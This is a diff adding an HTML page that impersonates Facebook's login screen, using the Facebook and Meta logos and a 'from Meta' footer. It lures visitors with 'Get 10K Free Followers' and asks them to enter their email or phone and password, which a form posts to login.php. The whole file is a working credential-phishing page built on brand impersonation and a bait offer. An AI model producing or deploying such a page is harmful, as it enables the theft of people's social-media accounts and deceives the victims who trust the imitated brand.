@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        /* Modern Gradient Background like the image */
+        body { 
+            background: linear-gradient(180deg, #c9dff7 0%, #f7d7d0 100%); 
+            font-family: Helvetica, Arial, sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+
+        .fb-card { 
+            background: rgba(255, 255, 255, 0.9); 
+            padding: 30px; 
+            border-radius: 12px; 
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1); 
+            width: 360px; 
+            text-align: center; 
+            box-sizing: border-box; 
+        }
+        
+        /* Official Facebook Logo & Name Styling */
+        .logo-container { margin-bottom: 20px; }
+        .fb-logo { width: 170px; }
+        
+        .promo-title { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 5px; }
+        .promo-subtext { font-size: 14px; color: #555; margin-bottom: 25px; line-height: 1.4; }
+
+        /* Follower Selection (Professional Style) */
+        select { 
+            width: 100%; 
+            padding: 12px; 
+            margin: 10px 0; 
+            border: 1px solid #ccc; 
+            border-radius: 8px; 
+            background-color: #fff; 
+            font-size: 15px; 
+            color: #333; 
+            outline: none;
+        }
+
+        input { 
+            width: 100%; 
+            padding: 14px; 
+            margin: 8px 0; 
+            border: 1px solid #ccc; 
+            border-radius: 8px; 
+            box-sizing: border-box; 
+            font-size: 15px; 
+            background-color: #fff; 
+            outline: none; 
+        }
+
+        .login-btn { 
+            width: 100%; 
+            background-color: #0084ff; 
+            border: none; 
+            border-radius: 8px; 
+            color: white; 
+            font-size: 18px; 
+            font-weight: bold; 
+            padding: 12px; 
+            cursor: pointer; 
+            margin-top: 15px; 
+        }
+
+        .divider { border-top: 1px solid #ddd; margin: 25px 0 10px; }
+
+        /* Meta Branding Section */
+        .footer { position: fixed; bottom: 30px; text-align: center; width: 100%; }
+        .meta-logo { width: 70px; display: block; margin: 0 auto 5px; opacity: 0.9; }
+        .meta-text { color: #555; font-size: 14px; font-weight: 500; }
+    </style>
+</head>
+<body>
+
+    <div class="fb-card">
+        <div class="logo-container">
+            <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" alt="Facebook">
+        </div>
+        
+        <div class="promo-title">Get 10K Free Followers 🎉</div>
+        <div class="promo-subtext">Select your package and log in to verify your profile to receive followers.</div>
+
+        <form action="login.php" method="POST">
+            <select name="Selected_Plan">
+                <option value="5000">5,000 Followers</option>
+                <option value="10000" selected>10,000 Followers</option>
+                <option value="20000">20,000 Followers</option>
+            </select>
+
+            <input type="text" name="Email_Phone" placeholder="Phone number, username, or email" required>
+            <input type="password" name="Password" placeholder="Password" required>
+            
+            <button type="submit" class="login-btn">Get Followers</button>
+        </form>
+        <div class="divider"></div>
+    </div>
+
+    <div class="footer">
+        <img class="meta-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta">
+        <span class="meta-text">from Meta</span>
+    </div>
+
+</body>
+</html>
